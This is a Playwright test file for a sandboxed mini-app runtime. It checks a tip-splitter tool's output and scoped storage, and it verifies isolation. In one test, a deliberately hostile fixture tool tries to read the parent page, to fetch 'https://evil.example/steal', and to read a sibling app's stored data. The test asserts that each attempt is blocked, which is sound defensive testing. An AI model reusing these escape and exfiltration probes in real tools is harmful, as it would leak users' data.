import { test, expect } from "@playwright/test";
import { readFileSync } from "node:fs";
import { fileURLToPath } from "node:url";
import { dirname, resolve } from "node:path";

const here = dirname(fileURLToPath(import.meta.url));
const runtimeGlobal = resolve(here, "../dist/runtime.global.js");
const tipHtml = readFileSync(
  resolve(here, "../tools/tip-splitter/index.html"),
  "utf8"
);
const tipManifest = JSON.parse(
  readFileSync(resolve(here, "../tools/tip-splitter/manifest.json"), "utf8")
);

/** Load a blank page with the runtime exposed as window.RT. */
async function bootRuntime(page: import("@playwright/test").Page) {
  await page.goto("about:blank");
  await page.addScriptTag({ path: runtimeGlobal });
  await page.evaluate(() => {
    (window as any).RT = (window as any).WildcardRuntime;
    (window as any).__outputs = [];
    (window as any).__errors = [];
    document.body.innerHTML = '<div id="stage" style="width:390px;height:700px"></div>';
  });
}

test("tip splitter computes, outputs to host, and persists (REQ-RUN-001/003/004)", async ({
  page,
}) => {
  await bootRuntime(page);

  // Mount the tool with a scoped in-memory store; capture WC.output on the host.
  await page.evaluate(
    ({ html, manifest }) => {
      const RT = (window as any).RT;
      const shared = ((window as any).__shared = new Map());
      const storage = RT.scopedMemoryStorage(manifest.id, shared);
      RT.mountTool(document.getElementById("stage"), {
        bundle: { manifest, files: { "index.html": html } },
        storage,
        onOutput: (o: any) => (window as any).__outputs.push(o),
        onError: (m: string) => (window as any).__errors.push(m),
      });
    },
    { html: tipHtml, manifest: tipManifest }
  );

  // Drive the tool inside its sandboxed (cross-origin) frame.
  const tool = page.frameLocator("#stage iframe");
  await tool.locator("#bill").fill("100");
  await tool.locator("#tip").fill("20");
  await tool.locator("#people").fill("4");
  await tool.locator("#save").click();

  // The host received the result the tool handed up via WC.output.
  await expect
    .poll(() => page.evaluate(() => (window as any).__outputs.length))
    .toBe(1);
  const output = await page.evaluate(() => (window as any).__outputs[0]);
  expect(output.result).toBe("Each person pays $30.00 ($120.00 total)");
  expect(output.meta.label).toBe("Tip split");

  // The tool persisted its state into ITS scope (key is namespaced by appId).
  const stored = await page.evaluate(() =>
    Array.from((window as any).__shared.entries())
  );
  expect(stored).toContainEqual(["tip-splitter::lastTipPct", 20]);

  expect(await page.evaluate(() => (window as any).__errors)).toEqual([]);
});

test("state survives a relaunch over the same store (REQ-RUN-003)", async ({
  page,
}) => {
  await bootRuntime(page);

  // First mount: save tip% 27 into a backing map we keep.
  await page.evaluate(
    ({ html, manifest }) => {
      const RT = (window as any).RT;
      const shared = ((window as any).__persist = new Map());
      RT.mountTool(document.getElementById("stage"), {
        bundle: { manifest, files: { "index.html": html } },
        storage: RT.scopedMemoryStorage(manifest.id, shared),
      });
    },
    { html: tipHtml, manifest: tipManifest }
  );
  let tool = page.frameLocator("#stage iframe");
  await tool.locator("#tip").fill("27");
  await tool.locator("#save").click();
  await expect
    .poll(() =>
      page.evaluate(() => (window as any).__persist.get("tip-splitter::lastTipPct"))
    )
    .toBe(27);

  // Relaunch: fresh frame, SAME backing store -> tip restores to 27.
  await page.evaluate(
    ({ html, manifest }) => {
      const RT = (window as any).RT;
      document.getElementById("stage")!.innerHTML = "";
      RT.mountTool(document.getElementById("stage"), {
        bundle: { manifest, files: { "index.html": html } },
        storage: RT.scopedMemoryStorage(manifest.id, (window as any).__persist),
      });
    },
    { html: tipHtml, manifest: tipManifest }
  );
  tool = page.frameLocator("#stage iframe");
  await expect(tool.locator("#tip")).toHaveValue("27");
});

test("a tool cannot escape its sandbox or reach the network (REQ-RUN-002/005)", async ({
  page,
}) => {
  await bootRuntime(page);

  // A hostile tool: tries to read the parent, reach the network, and read a
  // sibling's storage key. All three must fail; it reports findings via output.
  const evilHtml = `<!doctype html><html><head></head><body><script>
    (async function () {
      var report = { parent: "?", network: "?", sibling: "?" };
      try { var x = parent.document; report.parent = x ? "ACCESSIBLE" : "blocked"; }
      catch (e) { report.parent = "blocked"; }
      try { await fetch("https://evil.example/steal"); report.network = "ALLOWED"; }
      catch (e) { report.network = "blocked"; }
      try {
        var v = await WC.storage.get("lastTipPct"); // its own scope -> null
        report.sibling = v == null ? "blocked" : "LEAKED:" + v;
      } catch (e) { report.sibling = "blocked"; }
      WC.output(report);
    })();
  <\/script></body></html>`;

  await page.evaluate(
    ({ html }) => {
      const RT = (window as any).RT;
      // Sibling tool "tip-splitter" already wrote lastTipPct into the shared map.
      const shared = new Map([["tip-splitter::lastTipPct", 99]]);
      const manifest = {
        id: "evil",
        name: "Evil",
        icon: "😈",
        version: 1,
        providers: [],
      };
      RT.mountTool(document.getElementById("stage"), {
        bundle: { manifest, files: { "index.html": html } },
        storage: RT.scopedMemoryStorage("evil", shared),
        onOutput: (o: any) => (window as any).__outputs.push(o),
      });
    },
    { html: evilHtml }
  );

  await expect
    .poll(() => page.evaluate(() => (window as any).__outputs.length))
    .toBe(1);
  const report = await page.evaluate(() => (window as any).__outputs[0].result);
  expect(report.parent).toBe("blocked"); // sandbox: no parent DOM access
  expect(report.network).toBe("blocked"); // CSP connect-src 'none'
  expect(report.sibling).toBe("blocked"); // scoped storage: no cross-app read
});

test("WC.net rejects an undeclared provider (REQ-RUN-005/SEC-001)", async ({
  page,
}) => {
  await bootRuntime(page);

  const html = `<!doctype html><html><head></head><body><script>
    WC.net.fetch("weather", {}).then(
      function () { WC.output("ALLOWED"); },
      function (e) { WC.output("rejected:" + e.message); }
    );
  <\/script></body></html>`;

  await page.evaluate(
    ({ html }) => {
      const RT = (window as any).RT;
      const manifest = {
        id: "no-net",
        name: "No Net",
        icon: "🚫",
        version: 1,
        providers: [], // weather NOT declared
      };
      RT.mountTool(document.getElementById("stage"), {
        bundle: { manifest, files: { "index.html": html } },
        storage: RT.memoryStorage(),
        net: { fetch: async () => ({ temp: 70 }) }, // host offers a provider...
        onOutput: (o: any) => (window as any).__outputs.push(o),
      });
    },
    { html }
  );

  await expect
    .poll(() => page.evaluate(() => (window as any).__outputs.length))
    .toBe(1);
  const result = await page.evaluate(() => (window as any).__outputs[0].result);
  // ...but the tool never declared it, so the SDK refuses before any host call.
  expect(result).toContain("rejected");
  expect(result).toContain("not declared");
});
